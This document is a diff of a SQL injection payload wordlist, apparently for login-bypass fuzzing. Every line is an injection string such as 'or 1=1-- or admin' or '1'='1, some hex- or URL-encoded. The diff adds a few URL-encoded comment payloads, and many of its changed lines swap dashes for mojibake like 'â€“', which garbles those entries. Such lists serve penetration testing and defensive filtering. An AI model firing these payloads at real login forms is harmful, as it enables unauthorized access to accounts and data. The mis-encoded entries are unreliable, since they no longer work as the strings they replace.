@@ -8,7 +8,7 @@ anything' OR 'x'='x
 ' OR ''='
 '' OR ''=''
 'OR''='
-hey' or 1=1–
+hey' or 1=1â€“
 ''Or 1 = 1'
 ' or 1=1-- 
 or 1=1--
@@ -17,8 +17,13 @@ or 1=1--
 ' or 'a'='a
 " or "a"="a
 ') or ('a'='a
+%23 1
 hi") or ("a"="a
 'hi' or 'x'='x';
+2 or 1=1 %23%0A1
+%23%0A1
+desc %23
+%23
 x' or 1=1 or 'x'='y
 \x27\x4F\x52 SELECT *
 \x27\x6F\x72 SELECT *
@@ -30,67 +35,67 @@ admin"or 1=1 or ""="
 admin") or ("1"="1"--
 ' or "='
 '=' 'or'
-'or'1'='1 (güncel)
+'or'1'='1 (gÃ¼ncel)
 or 1=1
-or 1=1–
+or 1=1â€“
 or 1=1#
 or 1=1/*
-admin' —
+admin' â€”
 admin' #
 admin'/*
 admin' or '1'='1
-admin' or '1'='1'–
+admin' or '1'='1'â€“
 admin' or '1'='1'#
 admin' or '1'='1'/*
 admin'or 1=1 or "='
 admin' or 1=1
-admin' or 1=1–
+admin' or 1=1â€“
 admin' or 1=1#
 admin' or 1=1/*
 admin') or ('1'='1
-admin') or ('1'='1'–
+admin') or ('1'='1'â€“
 admin') or ('1'='1'#
 admin') or ('1'='1'/*
 admin') or '1'='1
-admin') or '1'='1'–
+admin') or '1'='1'â€“
 admin') or '1'='1'#
 admin') or '1'='1'/*
-admin" —
+admin" â€”
 admin" #
 admin"/*
 admin" or "1"="1
-admin" or "1"="1¨–
-admin" or "1"="1¨#
-admin" or "1"="1¨/*
+admin" or "1"="1Â¨â€“
+admin" or "1"="1Â¨#
+admin" or "1"="1Â¨/*
 admin"or 1=1 or ""="
 admin" or 1=1
-admin" or 1=1–
+admin" or 1=1â€“
 admin" or 1=1#
 admin" or 1=1/*
-admin") or ("1¨="1
-admin") or ("1¨="1¨–
-admin") or ("1¨="1¨#
-admin") or ("1¨="1¨/*
+admin") or ("1Â¨="1
+admin") or ("1Â¨="1Â¨â€“
+admin") or ("1Â¨="1Â¨#
+admin") or ("1Â¨="1Â¨/*
 admin") or "1"="1
-admin") or "1"="1¨–
-admin") or "1"="1¨#
-admin") or "1"="1¨/*
-' or true–
-') or true–
+admin") or "1"="1Â¨â€“
+admin") or "1"="1Â¨#
+admin") or "1"="1Â¨/*
+' or trueâ€“
+') or trueâ€“
 ') or (")=('
-') or 1–
+') or 1â€“
 ') or ('x')=('
-" or true–
+" or trueâ€“
 " or ""="
-" or 1–
+" or 1â€“
 " or "x"="
-") or true–
+") or trueâ€“
 ") or ("")=("
-") or 1–
+") or 1â€“
 ") or ("x")=("
-')) or true–
+')) or trueâ€“
 ')) or (("))=(('
-')) or 1–
+')) or 1â€“
 ')) or (('x'))=(('
 '-'
 '+'
@@ -112,11 +117,11 @@ admin") or "1"="1¨/*
 " or ""&amp;"
 " or ""^"
 " or ""*"
-or true–
-" or true–
-' or true–
-") or true–
-') or true–
+or trueâ€“
+" or trueâ€“
+' or trueâ€“
+") or trueâ€“
+') or trueâ€“
 ' or 'x'='x
 ') or ('x')=('x
 ')) or (('x'))=(('x
